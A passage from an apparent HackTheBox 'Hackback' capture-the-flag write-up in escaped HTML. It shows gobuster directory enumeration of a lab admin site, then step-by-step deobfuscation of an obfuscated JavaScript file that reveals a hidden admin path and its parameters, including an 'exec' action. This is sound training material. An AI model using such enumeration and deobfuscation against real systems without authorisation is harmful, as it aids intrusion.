    &amp;lt;label for=&quot;password&quot;&amp;gt;Password&amp;lt;/label&amp;gt;
    &amp;lt;input type=&quot;password&quot; placeholder=&quot;Enter Password&quot;&amp;gt;
    &amp;lt;input type=&quot;submit&quot; value=&quot;Log In&quot;&amp;gt;
    &amp;lt;a href=&quot;lost&quot;&amp;gt;Lost your Password?&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
    &amp;lt;a href=&quot;signup&quot;&amp;gt;Don't have An account?&amp;lt;/a&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;also-the-password-reset-and-sign-up-pages-are-non-existent-&quot;&gt;Also the password reset and sign-up pages are non-existent :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-the-page-source-&quot;&gt;By looking at the page source :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Admin Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/css/master.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login-box&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img/logo.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;avatar&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Avatar Image&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Login Here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- USERNAME INPUT --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- PASSWORD INPUT --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Log In&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lost&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Lost your Password?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signup&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Don't have An account?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-notice-this-weird-comment-----script-srcjsjsscript---&quot;&gt;We notice this weird comment : &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;however-js-gave-a-403-&quot;&gt;However &lt;code class=&quot;highlighter-rouge&quot;&gt;/js&lt;/code&gt; gave a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-js-extension-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.js&lt;/code&gt; extension :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirb/common.txt -x js
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/js/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : js
[+] Timeout      : 10s
=====================================================
2019/07/05 09:37:16 Starting gobuster
=====================================================
/private.js (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;script-deobfuscation&quot;&gt;Script Deobfuscation&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-privatejs-its-not-really-what-we-expect-a-javascript-file-to-be-&quot;&gt;By looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;private.js&lt;/code&gt; it’s not really what we expect a javascript file to be :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
	ine n=['\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k77\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\k33','\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q','\k77\k35\k48\k44\k72\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k39\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'];(shapgvba(p,q){ine r=shapgvba(s){juvyr(--s){p['chfu'](p['fuvsg']());}};r(++q);}(n,0k66));ine o=shapgvba(p,q){p=p-0k0;ine r=n[p];vs(o['ZfHYzi']===haqrsvarq){(shapgvba(){ine s;gel{ine t=Shapgvba('erghea\k20(shapgvba()\k20'+'{}.pbafgehpgbe(\k22erghea\k20guvf\k22)(\k20)'+');');s=t();}pngpu(u){s=jvaqbj;}ine v='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/=';s['ngbo']||(s['ngbo']=shapgvba(w){ine x=Fgevat(w)['ercynpr'](/=+$/,'');sbe(ine y=0k0,z,a,b=0k0,c='';a=x['puneNg'](b++);~a&amp;amp;&amp;amp;(z=y%0k4?z*0k40+a:a,y++%0k4)?c+=Fgevat['sebzPunePbqr'](0kss&amp;amp;z&amp;gt;&amp;gt;(-0k2*y&amp;amp;0k6)):0k0){a=v['vaqrkBs'](a);}erghea c;});}());ine d=shapgvba(e,q){ine g=[],h=0k0,i,j='',k='';e=ngbo(e);sbe(ine l=0k0,m=e['yratgu'];l&amp;lt;m;l++){k+='%'+('00'+e['punePbqrNg'](l)['gbFgevat'](0k10))['fyvpr'](-0k2);}e=qrpbqrHEVPbzcbarag(k);sbe(ine N=0k0;N&amp;lt;0k100;N++){g[N]=N;}sbe(N=0k0;N&amp;lt;0k100;N++){h=(h+g[N]+q['punePbqrNg'](N%q['yratgu']))%0k100;i=g[N];g[N]=g[h];g[h]=i;}N=0k0;h=0k0;sbe(ine O=0k0;O&amp;lt;e['yratgu'];O++){N=(N+0k1)%0k100;h=(h+g[N])%0k100;i=g[N];g[N]=g[h];g[h]=i;j+=Fgevat['sebzPunePbqr'](e['punePbqrNg'](O)^g[(g[N]+g[h])%0k100]);}erghea j;};o['BbNPpq']=d;o['dFYjTx']={};o['ZfHYzi']=!![];}ine P=o['dFYjTx'][p];vs(P===haqrsvarq){vs(o['cVwyDO']===haqrsvarq){o['cVwyDO']=!![];}r=o['BbNPpq'](r,q);o['dFYjTx'][p]=r;}ryfr{r=P;}erghea r;};ine k='\k53\k65\k63\k75\k72\k65\k20\k4p\k6s\k67\k69\k6r\k20\k42\k79\k70\k61\k73\k73';ine m=o('0k0','\k50\k5q\k53\k36');ine u=o('0k1','\k72\k37\k54\k59');ine l=o('0k2','\k44\k41\k71\k67');ine g='\k3s\k61\k63\k74\k69\k6s\k6r\k3q\k28\k73\k68\k6s\k77\k2p\k6p\k69\k73\k74\k2p\k65\k78\k65\k63\k2p\k69\k6r\k69\k74\k29';ine f='\k26\k73\k69\k74\k65\k3q\k28\k74\k77\k69\k74\k74\k65\k72\k2p\k70\k61\k79\k70\k61\k6p\k2p\k66\k61\k63\k65\k62\k6s\k6s\k6o\k2p\k68\k61\k63\k6o\k74\k68\k65\k62\k6s\k78\k29';ine v='\k26\k70\k61\k73\k73\k77\k6s\k72\k64\k3q\k2n\k2n\k2n\k2n\k2n\k2n\k2n\k2n';ine x='\k26\k73\k65\k73\k73\k69\k6s\k6r\k3q';ine j='\k4r\k6s\k74\k68\k69\k6r\k67\k20\k6q\k6s\k72\k65\k20\k74\k6s\k20\k73\k61\k79';
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;first-thing-we-notice-is-that-its-not-actually-js-ine-n--this-doesnt-look-like-js-most-likely-its-gonna-be-var-v-is-the-22nd-letter-in-alphabet-while-i-is-the-9th-22---9--13&quot;&gt;First thing we notice is that it’s not actually &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;ine n&lt;/code&gt; ? This doesn’t look like &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt;, most likely it’s gonna be &lt;code class=&quot;highlighter-rouge&quot;&gt;var&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;v&lt;/code&gt; is the 22nd letter in alphabet while &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; is the 9th. &lt;code class=&quot;highlighter-rouge&quot;&gt;22 - 9 = 13&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;so-this-script-is-rot-13-encoded-i-used-rot13com-to-decode-it-&quot;&gt;So this script is &lt;code class=&quot;highlighter-rouge&quot;&gt;rot 13&lt;/code&gt; encoded. I used &lt;a href=&quot;https://www.rot13.com&quot;&gt;rot13.com&lt;/a&gt; to decode it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a=['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33','\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d','\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x66));var b=function(c,d){c=c-0x0;var e=a[c];if(b['MsULmv']===undefined){(function(){var f;try{var g=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');f=g();}catch(h){f=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';f['atob']||(f['atob']=function(j){var k=String(j)['replace'](/=+$/,'');for(var l=0x0,m,n,o=0x0,p='';n=k['charAt'](o++);~n&amp;amp;&amp;amp;(m=l%0x4?m*0x40+n:n,l++%0x4)?p+=String['fromCharCode'](0xff&amp;amp;m&amp;gt;&amp;gt;(-0x2*l&amp;amp;0x6)):0x0){n=i['indexOf'](n);}return p;});}());var q=function(r,d){var t=[],u=0x0,v,w='',x='';r=atob(r);for(var y=0x0,z=r['length'];y&amp;lt;z;y++){x+='%'+('00'+r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}r=decodeURIComponent(x);for(var A=0x0;A&amp;lt;0x100;A++){t[A]=A;}for(A=0x0;A&amp;lt;0x100;A++){u=(u+t[A]+d['charCodeAt'](A%d['length']))%0x100;v=t[A];t[A]=t[u];t[u]=v;}A=0x0;u=0x0;for(var B=0x0;B&amp;lt;r['length'];B++){A=(A+0x1)%0x100;u=(u+t[A])%0x100;v=t[A];t[A]=t[u];t[u]=v;w+=String['fromCharCode'](r['charCodeAt'](B)^t[(t[A]+t[u])%0x100]);}return w;};b['OoACcd']=q;b['qSLwGk']={};b['MsULmv']=!![];}var C=b['qSLwGk'][c];if(C===undefined){if(b['pIjlQB']===undefined){b['pIjlQB']=!![];}e=b['OoACcd'](e,d);b['qSLwGk'][c]=e;}else{e=C;}return e;};var x='\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';var z=b('0x0','\x50\x5d\x53\x36');var h=b('0x1','\x72\x37\x54\x59');var y=b('0x2','\x44\x41\x71\x67');var t='\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';var s='\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';var i='\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';var k='\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';var w='\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-this-is-better-i-also-used-a-js-beautifier-to-make-it-easily-readable-&quot;&gt;Now this is better. I also used a &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; beautifier to make it easily readable :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];
(function(c, d) {
    var e = function(f) {
        while (--f) {
            c['push'](c['shift']());
        }
    };
    e(++d);
}(a, 0x66));
var b = function(c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['MsULmv'] === undefined) {
        (function() {
            var f;
            try {
                var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
                f = g();
            } catch (h) {
                f = window;
            }
            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            f['atob'] || (f['atob'] = function(j) {
                var k = String(j)['replace'](/=+$/, '');
                for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n &amp;amp;&amp;amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff &amp;amp; m &amp;gt;&amp;gt; (-0x2 * l &amp;amp; 0x6)) : 0x0) {
                    n = i['indexOf'](n);
                }
                return p;
            });
        }());
        var q = function(r, d) {
            var t = [],
                u = 0x0,
                v, w = '',
                x = '';
            r = atob(r);
            for (var y = 0x0, z = r['length']; y &amp;lt; z; y++) {
                x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);
            }
            r = decodeURIComponent(x);
            for (var A = 0x0; A &amp;lt; 0x100; A++) {
                t[A] = A;
            }
            for (A = 0x0; A &amp;lt; 0x100; A++) {
                u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
            }
            A = 0x0;
            u = 0x0;
            for (var B = 0x0; B &amp;lt; r['length']; B++) {
                A = (A + 0x1) % 0x100;
                u = (u + t[A]) % 0x100;
                v = t[A];
                t[A] = t[u];
                t[u] = v;
                w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);
            }
            return w;
        };
        b['OoACcd'] = q;
        b['qSLwGk'] = {};
        b['MsULmv'] = !![];
    }
    var C = b['qSLwGk'][c];
    if (C === undefined) {
        if (b['pIjlQB'] === undefined) {
            b['pIjlQB'] = !![];
        }
        e = b['OoACcd'](e, d);
        b['qSLwGk'][c] = e;
    } else {
        e = C;
    }
    return e;
};
var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';
var z = b('0x0', '\x50\x5d\x53\x36');
var h = b('0x1', '\x72\x37\x54\x59');
var y = b('0x2', '\x44\x41\x71\x67');
var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';
var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';
var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';
var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';
var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;as-you-can-see-its-still-heavily-obfuscated-i-solved-this-by-pasting-the-code-in-the-js-console-it-will-do-the-magic-happening-in-these-functions-then-we-can-just-read-the-variables-at-the-bottom-of-the-script--x-z-h-y-t-s-i-k-w&quot;&gt;As you can see it’s still heavily obfuscated, I solved this by pasting the code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; console. It will do the magic happening in these functions then we can just read the variables at the bottom of the script : &lt;code class=&quot;highlighter-rouge&quot;&gt;x z h y t s i k w&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-this-message-&quot;&gt;We got this message :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Secure Login Bypass
Remember the secret path is
2bb6916122f1da34dcd916421e531578
Just in case I loose access to the admin panel
?action=(show,list,exec,init)
&amp;amp;site=(twitter,paypal,facebook,hackthebox)
&amp;amp;password=*****
&amp;amp;session=
Nothing more to say
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;going-to-that-path-only-caused-a-redirect-so-we-need-to-enumerate-more&quot;&gt;Going to that path only caused a redirect, so we need to enumerate more.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;accessing-the-secret-path&quot;&gt;Accessing the Secret Path&lt;/h3&gt;
&lt;h4 id=&quot;from-the-secret-message-we-know-what-parameters-its-expecting-us-to-send--actionsitepasswordsession-this-is-probably-gonna-be-a-php-page-so-i-ran-gobuster-on-that-path-with-the-same-wordlist-i-used-before-and-php-extension-&quot;&gt;From the secret message we know what parameters it’s expecting us to send : (&lt;code class=&quot;highlighter-rouge&quot;&gt;?action=&amp;amp;site=&amp;amp;password=&amp;amp;session=&lt;/code&gt;). This is probably gonna be a &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; page. So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on that path with the same wordlist I used before and &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# gobuster -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/common.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
